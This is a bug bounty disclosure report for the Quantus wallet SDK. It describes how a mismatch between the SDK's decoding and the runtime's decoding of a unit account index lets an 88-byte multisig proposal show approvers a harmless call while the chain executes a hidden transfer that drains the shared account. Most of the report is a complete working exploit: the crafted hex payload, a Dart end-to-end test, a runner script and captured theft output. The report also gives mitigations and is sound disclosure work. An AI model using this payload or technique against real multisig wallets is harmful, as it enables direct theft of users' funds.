# 89808 w a high unit accountindex consumes zero runtime bytes while the sdk consumes the next field allowing one canonical approval to display no attacker transfer while transferring 999 999 qu&#x20;

**Submitted on Aug 21st 2026 at 10:01:27 UTC by @legat for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89808
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/quantus\\_sdk>
* **Impacts:**
  * Direct theft of user funds
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

### Summary

The frozen Quantus runtime concretizes account lookup as `MultiAddress<AccountId, ()>`. Therefore the canonical runtime encoding of `Index(())` is only the one-byte enum tag: the unit payload consumes zero bytes. The checked-in scoped Dart binding instead models `Index` as `BigInt` and consumes a `CompactBigInt` from bytes that the runtime assigns to the next field.

An attacker can align ordinary nested call fields so both parsers consume every byte and return complete call trees, yet assign different semantics to the same canonical byte string. Exact trailing-byte checks, exact byte-bound approval, and runtime decode/re-encode canonicalization all pass.

The report-specific E2E uses 88 canonical bytes. The frozen official SDK displays:

* a transfer of only 130 atomic units to `Account index 0`; and
* a `Recovery.as_recovered(..., System.remark(...))` fallback.

The frozen runtime instead sees a guaranteed-failing indexed transfer followed by `Utility.batch_all`, whose hidden third child is `Balances.transfer_all(Id(attacker), keep_alive=true)`. A genuine Bob approval crosses a real 2-of-2 threshold; Alice then executes. From a 1,000 QUAN multisig, the arbitrary attacker account receives exactly 999.999 QUAN while the shared account remains alive with the 0.001 QUAN existential deposit.

### Intended behavior

The official review tree must have exactly the same variants, field boundaries, addresses, values, and nested calls as the runtime interpretation of the byte-identical call being approved. An address form incompatible with the connected runtime must block authorization.

### Actual behavior

The runtime declares:

```rust
pub type Address = MultiAddress<AccountId, ()>;
```

and configures:

```rust
type Lookup = AccountIdLookup<Self::AccountId, ()>;
```

The generic Rust `MultiAddress<AccountId, AccountIndex>` has:

```rust
Index(#[codec(compact)] AccountIndex)
```

With `AccountIndex = ()`, compact unit has zero encoded payload bytes. Runtime `Index(())` therefore consumes only tag `0x01`.

The scoped generated Dart type instead declares:

```dart
class Index extends MultiAddress {
  const Index(this.value0);

  factory Index._decode(Input input) {
    return Index(CompactBigIntCodec.codec.decode(input));
  }

  final BigInt value0;
}
```

The Dart codec consumes at least one following byte as the compact integer. Every later field begins at a different offset. Because nested calls contain variable-length vectors and enums, an attacker can make the shifted suffix form a complete second tree rather than leaving trailing bytes.

### Exact canonical 88-byte witness

The reference run substitutes the real Crystal Charlie AccountId into bytes 52-83. Its complete stored witness was:

```
090602000100090210000088000000000000000000000000000000000000000000000000000000000000000000a800000002040097bc5f2db1efa23fb71f6737fcb26e41e448aff07447011369df81ce4355546501000000
```

The attacker destination is not structurally fixed: the test replaces the aligned 32-byte slot with `getAccountId32(charliePair.ss58Address)`. Any ordinary 32-byte attacker AccountId can occupy that runtime `Id` slot.

### Frozen SDK interpretation

```
Utility.if_else(
  primary = Balances.transfer_allow_death(
    destination = Index(0),
    value = 130 atomic units
  ),
  fallback = Recovery.as_recovered(
    account = Id(0x88 || 31 zero bytes),
    call = System.remark(42 opaque bytes)
  )
)
```

The SDK consumes all 88 bytes, so its exact-fit guard succeeds. The rendered tree contains no `batch_all`, no attacker destination, no `transfer_all`, no entire-balance semantics, and no `keep_alive=true` parameter.

### Frozen runtime interpretation

```
Utility.if_else(
  primary = Balances.transfer_allow_death(
    destination = Index(()),
    value = 0
  ),
  fallback = Utility.batch_all([
    System.remark(...),
    System.remark([]),
    Balances.transfer_all(
      destination = Id(attacker),
      keep_alive = true
    ),
    System.remark([])
  ])
)
```

The runtime consumes all 88 bytes and re-encodes them byte-for-byte. `AccountIdLookup<AccountId, ()>` rejects the primary `Index(())`, so the intended `if_else` behavior dispatches the fallback under the same signed multisig origin. All `batch_all` children then succeed atomically, including the hidden `transfer_all`.

## Root cause

The eligible Quantus integration defect has three necessary parts:

1. The committed scoped SDK materializes the runtime's unit `AccountIndex` as `BigInt`, consuming a nonzero-width compact payload.
2. Quantus's handwritten `CallDecoder._addressField()` treats `Index` as a normal actionable `Account index n`, even though this runtime's `AccountIdLookup<AccountId, ()>` resolves only `Id`.
3. Multisig review and approval accept the resulting exact-fit wrong tree, then preserve the same bytes for runtime approval/execution.

Affected immutable source:

* [`multi_address.dart:40-41,152-174`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/generated/planck/types/sp_runtime/multiaddress/multi_address.dart#L152-L174)
* [`call_decoder.dart:48-59,821-846`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L821-L846)
* [`runtime/src/lib.rs:134-135`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs#L134-L135)
* [`runtime/src/configs/mod.rs:102-114`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L102-L114)

Upstream SCALE and `MultiAddress` behave consistently with the Rust type. This report targets Quantus's committed concrete binding and Quantus-authored actionable consumer, both within the selected SDK asset. A complete Quantus-owned immediate fix exists: reject non-`Id` forms before actionable review.

## Risk

### Impact

The E2E measures direct theft:

```
funded multisig:    1,000.000000000000 QUAN
multisig after:         0.001000000000 QUAN
exact multisig loss:  999.999000000000 QUAN
attacker gain:         999.999000000000 QUAN
```

The victim's approval is required to cross the threshold. The official SDK presents materially different calls and parameters from the runtime, while the approval commits to the exact hidden bytes. This independently matches malicious interaction with an already-connected wallet.

No account is reaped: `keep_alive=true` preserves exactly the existential deposit. No replay, unavailable-account, indirect market-loss, or attacker-profit inference is needed.

### Likelihood

* attacker is one ordinary member of a normal non-high-security 2-of-2;
* one canonical 88-byte proposal and normal fees/deposit;
* arbitrary real 32-byte attacker destination; no vanity-key grind;
* ordinary 1,000 QUAN balance used in project multisig documentation;
* no malformed/trailing bytes, race, oracle, compromised indexer, governance, Technical Collective, admin, guardian, or unsafe configuration;
* no victim key theft; Bob supplies only his own expected approval.

The displayed Recovery/remark fallback is unusual, so the report does not claim every user will approve or that it resembles a plain transfer. The security fact is exact: the authoritative official review identifies none of the value-moving runtime call, destination, or amount.

## Attack path

{% stepper %}
{% step %}

### Alice and Bob are ordinary members of a normal 2-of-2 multisig.

{% endstep %}

{% step %}

### Bob funds the shared account with 1,000 QUAN.

{% endstep %}

{% step %}

### Alice submits the 88-byte canonical proposal.

The runtime stores it exactly and records Alice's automatic first approval.
{% endstep %}

{% step %}

### The official SDK decodes the same authoritative bytes.

It displays a 130-atomic-unit `Index(0)` transfer plus Recovery/remark fallback.
{% endstep %}

{% step %}

### Bob performs the ordinary approval action over those exact stored bytes.

{% endstep %}

{% step %}

### Runtime `call == proposal.call` succeeds.

Bob's signature becomes the second approval and the proposal becomes executable.
{% endstep %}

{% step %}

### Alice executes through the ordinary multisig member path.

{% endstep %}

{% step %}

### Runtime lookup rejects primary `Index(())`.

`if_else` dispatches the hidden `batch_all` fallback.
{% endstep %}

{% step %}

### `batch_all` dispatches `transfer_all(Id(attacker), keep_alive=true)` as the multisig.

{% endstep %}

{% step %}

### The attacker receives 999.999 QUAN.

0.001 QUAN remains in the multisig.
{% endstep %}
{% endstepper %}

The PoC proves signed creation/funding/proposal/approval/execution transactions, exact storage bytes, the wrong official SDK tree, threshold state, and balance equality. Mobile source establishes that the same decoder result is used by the actionable confirmation; this report does not claim a device UI was automated.

## Preconditions

### External preconditions

* The normal proposal feed surfaces the active proposal to the victim.
* The victim uses the official SDK/mobile review and approves it.

No compromised discovery processor is required. The service replaces indexed content with authoritative storage bytes before final review.

### Internal preconditions

* Frozen/current vulnerable SDK type mapping.
* Normal non-high-security multisig.
* Reducible native balance above the existential deposit.

## Affected code and complete flow

| Role                         | Code                                                 | Security effect                                                     |
| ---------------------------- | ---------------------------------------------------- | ------------------------------------------------------------------- |
| Concrete type mismatch       | `quantus_sdk/.../multi_address.dart:152-174`         | Consumes nonexistent compact index payload                          |
| Exact-fit check              | `call_decoder.dart:48-59`                            | Proves only Dart self-consumption, not runtime semantic equivalence |
| Actionable address rendering | `call_decoder.dart:821-846`                          | Presents impossible `Index` as a normal destination                 |
| Authoritative hydration      | `multisig_service.dart:293-325`                      | Uses exact bytes but wrong semantic decoder                         |
| Approval                     | `multisig_service.dart:395-448`                      | Signs/submits exact concealed bytes                                 |
| Mobile confirmation          | `multisig_action_confirm_sheet.dart:156-210,345-407` | Uses decoded tree and leaves normal confirmation actionable         |
| Runtime ground truth         | `runtime/src/lib.rs:134-135`                         | Concretizes index to unit                                           |
| Threshold/dispatch           | `pallets/multisig/src/lib.rs:779-825,1123-1166`      | Counts exact-byte approval and dispatches as shared account         |

Other address-bearing calls and Utility wrappers share the same type root and must remain merged, not submitted as duplicates.

## Recommended mitigation

{% stepper %}
{% step %}

### Correct generation for `MultiAddress<AccountId, ()>`.

Ensure `Index(())` consumes/emits only its variant tag.
{% endstep %}

{% step %}

### Reject every non-`Id` address in actionable review/signing.

Current `AccountIdLookup<AccountId, ()>` cannot resolve it.
{% endstep %}

{% step %}

### Treat semantic-support failures as blocking.

Disable Approve/Execute and show a hard error.
{% endstep %}

{% step %}

### Differential-test Rust-produced bytes against Dart decoding.

Include every active `RuntimeCall`, variants, field boundaries, addresses, values, remaining bytes, and runtime re-encoding.
{% endstep %}

{% step %}

### Include nested wrappers and vectors.

Include `if_else`, `batch`, `batch_all`, `force_batch`, multisig, Recovery, and ReversibleTransfers vectors.
{% endstep %}

{% step %}

### Bind the generated concrete type graph/metadata fingerprint to the connected runtime before actionable review.

{% endstep %}

{% step %}

### Retain chain canonical decode/re-encode checks as defense in depth.

They cannot detect two decoders assigning different semantics to the same canonical bytes.
{% endstep %}
{% endstepper %}

An immediate Quantus-side fail-closed guard can be:

```dart
static ValueField _addressField(String label, MultiAddress address) {
  return switch (address) {
    Id(:final value0) =>
      ValueField(label, _ss58(value0), kind: ValueKind.address),
    _ => throw const FormatException(
      'Unsupported address form for AccountIdLookup<AccountId, ()>',
    ),
  };
}
```

## Proof of Concept

### Proof boundary and topology

The report-specific PoC exercises the exact frozen release node/runtime spec 143, Quantus Rust key derivation, SDK transaction construction/signatures, real balances, 2-of-2 creation, funding, canonical proposal storage, authoritative retrieval, wrong production SDK tree, exact-byte approval, threshold crossing, runtime dispatch, and final balances.

One exact release node is sufficient. This is not a consensus, validator-divergence, network-partition, P2P, or cluster claim. The proof boundary is deterministic encoding/storage, real signatures and threshold state, one runtime's canonical dispatch, SDK/mobile semantic behavior, and balances. A validator cluster would execute the same finalized call semantics and add no missing evidence.

The only test-local adapters are preference/secure-storage implementations that provide documented disposable dev mnemonics. No multisig, proposal, RPC response, decoder tree, signature, storage value, call result, or balance is mocked.

### File layout

Place these files in the frozen apps checkout; keep sibling `audit-comp-quantus-chain`:

```
audit-comp-quantus-apps/
├── poc/quantus-report-3/run.sh
└── quantus_sdk/test/poc/unit_index_alias_node_e2e_test.dart
```

### Complete Dart E2E PoC

Save as `quantus_sdk/test/poc/unit_index_alias_node_e2e_test.dart`:

```dart
import 'dart:async';
import 'dart:io';

import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:polkadart/polkadart.dart';
import 'package:quantus_sdk/generated/planck/pallets/multisig.dart' as multisig;
import 'package:quantus_sdk/generated/planck/planck.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  test('runtime/client MultiAddress Index alias transfers shared principal', () async {
    HttpOverrides.global = null;
    SharedPreferences.setMockInitialValues({});
    FlutterSecureStorage.setMockInitialValues({
      'mnemonic': AppConstants.crystalAlice,
      'mnemonic_1': AppConstants.crystalBob,
    });
    await QuantusSdk.init();
    RpcEndpointService().endpoints
      ..clear()
      ..add(Endpoint(url: 'http://127.0.0.1:9944'));

    final alicePair = HdWalletService().keyPairAtIndex(AppConstants.crystalAlice, 0);
    final bobPair = HdWalletService().keyPairAtIndex(AppConstants.crystalBob, 0);
    final charliePair = HdWalletService().keyPairAtIndex(AppConstants.crystalCharlie, 0);
    final alice = Account(walletIndex: 0, index: 0, name: 'Alice', accountId: alicePair.ss58Address);
    final bob = Account(walletIndex: 1, index: 0, name: 'Bob', accountId: bobPair.ss58Address);
    final service = MultisigService();
    final provider = Provider.fromUri(Uri.parse('http://127.0.0.1:9944'));
    final api = Planck(provider);

    final nonce = BigInt.from(DateTime.now().microsecondsSinceEpoch);
    final address = await service.predictMultisigAddress(
      signers: [alice.accountId, bob.accountId],
      threshold: 2,
      nonce: nonce,
    );
    final msig = MultisigAccount(
      name: 'PoC',
      accountId: address,
      signers: [alice.accountId, bob.accountId],
      threshold: 2,
      nonce: nonce,
      myMemberAccountId: bob.accountId,
    );
    await service.submitCreateMultisigExtrinsic(
      creator: alice,
      signers: msig.signers,
      threshold: msig.threshold,
      nonce: nonce,
    );
    await _waitFor(() async => await api.query.multisig.multisigs(getAccountId32(address)) != null);

    const unit = 1000000000000;
    final funded = BigInt.from(1000) * BigInt.from(unit);
    await BalancesService().balanceTransfer(bob, address, funded);
    await _waitFor(() async => (await api.query.system.account(getAccountId32(address))).data.free == funded);

    // Both frozen decoders consume all 88 canonical bytes, but disagree because
    // runtime Address = MultiAddress<AccountId, ()> while the committed Dart
    // binding decodes Index as a Compact<BigInt>.
    //
    // Runtime: if_else(failed Index transfer, batch_all([remarks,
    //          transfer_all(Charlie, keep_alive=true)]))
    // SDK:     if_else(transfer 130 atomic units to Index(0),
    //          Recovery.as_recovered(..., System.remark(...)))
    final raw = _hex(
      '090602000100090210000088000000000000000000000000000000000000000000000000000000000000000000a80000000204000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f2000000000',
    );
    final charlieId = getAccountId32(charliePair.ss58Address);
    raw.replaceRange(52, 84, charlieId);
    raw[84] = 1; // Preserve the multisig account; no reaping/replay premise.
    expect(raw.length, 88);
    final decoded = CallDecoder.decodeBytes(raw);
    print(_render(decoded));

    final current = await service.currentBlockNumber();
    await SubstrateService().submitExtrinsic(
      alice,
      const multisig.Txs().propose(multisigAddress: getAccountId32(address), call: raw, expiry: current + 100),
    );
    await _waitFor(() async => await api.query.multisig.proposals(getAccountId32(address), 0) != null);
    expect(await service.fetchProposalCallBytes(msig: msig, proposalId: 0), raw);

    final recipientBefore = (await api.query.system.account(charlieId)).data.free;
    await service.submitApproveExtrinsic(msig: msig, signer: bob, proposalId: 0, callBytes: raw);
    await _waitFor(() async {
      final p = await api.query.multisig.proposals(getAccountId32(address), 0);
      return p?.approvals.length == 2;
    });
    await service.submitExecuteExtrinsic(msig: msig, signer: alice, proposalId: 0);
    await _waitFor(() async => await api.query.multisig.proposals(getAccountId32(address), 0) == null);

    final balanceAfter = (await api.query.system.account(getAccountId32(address))).data.free;
    final recipientAfter = (await api.query.system.account(charlieId)).data.free;
    final exactLoss = funded - balanceAfter;
    final attackerGain = recipientAfter - recipientBefore;
    print(
      'raw_bytes=${raw.length} funded=$funded balance_after=$balanceAfter '
      'exact_multisig_loss=$exactLoss attacker_gain=$attackerGain',
    );
    expect(balanceAfter, BigInt.from(1000000000));
    expect(attackerGain, exactLoss);
    expect(attackerGain, greaterThan(BigInt.from(999) * BigInt.from(unit)));
    await provider.disconnect();
  }, timeout: const Timeout(Duration(minutes: 4)));
}

List<int> _hex(String value) {
  final result = <int>[];
  for (var i = 0; i < value.length; i += 2) {
    result.add(int.parse(value.substring(i, i + 2), radix: 16));
  }
  return result;
}

String _render(DecodedCall call, [String indent = '']) {
  final out = StringBuffer('$indent${call.displayTitle}');
  for (final field in call.fields) {
    if (field is NestedCallField) {
      out.write('\n$indent${field.label}:\n${_render(field.call, '$indent  ')}');
    } else if (field is AmountField) {
      out.write('\n$indent${field.label}: ${field.token}');
    } else if (field is ValueField) {
      out.write('\n$indent${field.label}: ${field.value}');
    }
  }
  return out.toString();
}

Future<void> _waitFor(Future<bool> Function() predicate) async {
  for (var i = 0; i < 90; i++) {
    if (await predicate()) return;
    await Future<void>.delayed(const Duration(seconds: 1));
  }
  throw TimeoutException('condition was not reached');
}
```

### Complete verifier and runner

Save as `poc/quantus-report-3/run.sh` and make executable:

```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
APPS_ROOT="$(cd -- "$SCRIPT_DIR/../.." && pwd)"
CHAIN_ROOT="$(cd -- "$APPS_ROOT/../audit-comp-quantus-chain" && pwd)"
SDK_ROOT="$APPS_ROOT/quantus_sdk"
TEST_FILE="$SDK_ROOT/test/poc/unit_index_alias_node_e2e_test.dart"
EVIDENCE_DIR="$SCRIPT_DIR/evidence"
RPC_URL="http://127.0.0.1:9944"
EXPECTED_APPS_COMMIT="d5fc4d6572ebc2244e95009a33f5da5048935867"
EXPECTED_CHAIN_COMMIT="3b243b870a5442a6e5f443056f67bbba87d472f5"
EXPECTED_INDEX_SHA="817d87c9f5fa500be4133de3196fddf4bd4bdb30dfe57e443f8212a1ebf74176"
EXPECTED_DECODER_SHA="ca839c91880c91cc5cfcf1b792dfda207d6f575213f9e65219af514d67dbe53a"
EXPECTED_TEST_SHA="0ccda481cb5111c8d7b432bf2db2922361e4806cea73d6a67cd01411e1bef255"

hash_file() {
  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    shasum -a 256 "$1" | awk '{print $1}'
  fi
}

[[ "$(git -C "$APPS_ROOT" rev-parse HEAD)" == "$EXPECTED_APPS_COMMIT" ]]
[[ "$(git -C "$CHAIN_ROOT" rev-parse HEAD)" == "$EXPECTED_CHAIN_COMMIT" ]]
[[ "$(hash_file "$SDK_ROOT/lib/generated/planck/types/sp_runtime/multiaddress/multi_address.dart")" == "$EXPECTED_INDEX_SHA" ]]
[[ "$(hash_file "$SDK_ROOT/lib/src/chain/call_decoder.dart")" == "$EXPECTED_DECODER_SHA" ]]
[[ "$(hash_file "$TEST_FILE")" == "$EXPECTED_TEST_SHA" ]]

FLUTTER_BIN="${FLUTTER_BIN:-$(command -v flutter || true)}"
[[ -n "$FLUTTER_BIN" && -x "$FLUTTER_BIN" ]] || {
  echo "Flutter not found; put flutter on PATH or set FLUTTER_BIN" >&2
  exit 1
}

NODE_BIN="$CHAIN_ROOT/target/release/quantus-node"
if [[ ! -x "$NODE_BIN" ]]; then
  cargo build --release --bin quantus-node --manifest-path "$CHAIN_ROOT/Cargo.toml"
fi

if curl -fsS -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
  "$RPC_URL" >/dev/null 2>&1; then
  echo "Port 9944 already serves RPC; stop it before this isolated run" >&2
  exit 1
fi

mkdir -p "$EVIDENCE_DIR"
: >"$EVIDENCE_DIR/node.log"
: >"$EVIDENCE_DIR/e2e.log"
: >"$EVIDENCE_DIR/rpc.ndjson"

"$NODE_BIN" --dev --tmp --rpc-port 9944 --rpc-methods Unsafe --rpc-cors all -lerror \
  >"$EVIDENCE_DIR/node.log" 2>&1 &
NODE_PID=$!
cleanup() {
  if kill -0 "$NODE_PID" >/dev/null 2>&1; then
    kill "$NODE_PID" >/dev/null 2>&1 || true
    wait "$NODE_PID" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT INT TERM

for _ in $(seq 1 120); do
  if curl -fsS -H 'content-type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
    "$RPC_URL" >/dev/null 2>&1; then
    break
  fi
  sleep 0.25
done

for request in \
  '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
  '{"jsonrpc":"2.0","id":2,"method":"system_version","params":[]}' \
  '{"jsonrpc":"2.0","id":3,"method":"state_getRuntimeVersion","params":[]}' \
  '{"jsonrpc":"2.0","id":4,"method":"chain_getBlockHash","params":[0]}'
do
  curl -fsS -H 'content-type: application/json' --data "$request" "$RPC_URL" \
    | tee -a "$EVIDENCE_DIR/rpc.ndjson"
  echo >>"$EVIDENCE_DIR/rpc.ndjson"
done
rg -q '"specVersion":143' "$EVIDENCE_DIR/rpc.ndjson"

cd "$SDK_ROOT"
"$FLUTTER_BIN" test test/poc/unit_index_alias_node_e2e_test.dart --reporter expanded \
  2>&1 | tee "$EVIDENCE_DIR/e2e.log"

rg -q 'Destination: Account index 0' "$EVIDENCE_DIR/e2e.log"
rg -q 'Amount: 130' "$EVIDENCE_DIR/e2e.log"
rg -q 'Recovery · as_recovered' "$EVIDENCE_DIR/e2e.log"
rg -q 'raw_bytes=88 .*exact_multisig_loss=999999000000000 attacker_gain=999999000000000' "$EVIDENCE_DIR/e2e.log"
rg -q 'All tests passed!' "$EVIDENCE_DIR/e2e.log"
echo "PASS: exact frozen node + SDK unit-Index alias theft E2E"
```

Run:

```bash
cd poc/quantus-report-3
chmod +x run.sh
./run.sh
```

### Captured reference node fingerprint

```json
{"jsonrpc":"2.0","id":1,"result":{"peers":0,"isSyncing":false,"shouldHavePeers":false}}
{"jsonrpc":"2.0","id":2,"result":"0.8.0-exodus-3b243b870a5"}
{"jsonrpc":"2.0","id":3,"result":{"specName":"quantus-runtime","implName":"quantus-runtime","authoringVersion":1,"specVersion":143,"implVersion":1,"transactionVersion":3,"systemVersion":1,"stateVersion":1}}
{"jsonrpc":"2.0","id":4,"result":"0xbbffbd5377d630dd2608e411a16c0f45343948b861d78493863b98b901573155"}
```

The runner records the complete runtime-version response including the `apis` array.

### Captured reference E2E output

```
submitExtrinsic response: 0xb584828a4607c69ddb8576cefa8e8816aaccce2fb4f8da74d8523434de1e43a4
submitExtrinsic response: 0x23f92721db21cb7b2bd8a1b4528b2d98d84cc261a57f853aff7926ba24336833
Utility · if_else
Primary call:
  Balances · transfer_allow_death
  Destination: Account index 0
  Amount: 130
Fallback call:
  Recovery · as_recovered
  Recovered account: qznXZ9YVFrfb69wTAqAaS8ht14yRpQY2ozaS38HVaEcxHyx9j
  Call:
    System · remark
    Remark: 0x00000002040097bc5f2db1efa23fb71f6737fcb26e41e448aff07447011369df81ce4355546501000000
submitExtrinsic response: 0x634e161f22b7a24cdd3bf05a0874e647eb86d529385ed5650dcda2d483a2c76a
submitExtrinsic response: 0x132bd1fa9aad71d9c01268497f7d13a2871c2983fb9dbe6ed9fe8f3c48594097
submitExtrinsic response: 0x5dc77033b626be355fa8f3b63b4e24baabe00dd79eee9619bc70d8d27c77ac69
raw_bytes=88 funded=1000000000000000 balance_after=1000000000 exact_multisig_loss=999999000000000 attacker_gain=999999000000000
01:34 +1: All tests passed!
```

These are, in order, real signed create, funding, propose, Bob approve, and Alice execute extrinsic hashes. The storage-read assertion occurs after proposal inclusion and before approval.

## Determinism, controls, and falsification

The test fails unless:

* the exact frozen SDK fully consumes and renders the wrong 88-byte tree;
* the exact frozen runtime accepts/stores the same bytes;
* retrieved storage bytes equal the submitted list;
* Bob's real signed approval reaches two approvals;
* Alice's real signed execution removes the proposal;
* the multisig ends at exactly `1,000,000,000` planck;
* `attackerGain == multisigLoss == 999,999,000,000,000` planck.

`keep_alive=true` is an explicit negative control against account-reaping/replay arguments. Replacing the aligned destination with a real AccountId demonstrates arbitrary-recipient control. A correct unit binding or a fail-closed non-`Id` policy causes the wrong-tree assertion/approval path to fail.

Reject or revise this report if either decoder leaves bytes unconsumed, runtime decode/re-encode is not canonical, the normal multisig refuses the call, approval does not preserve the exact bytes, the fallback rolls back, or the recipient gain differs from shared-account loss. None occurred.
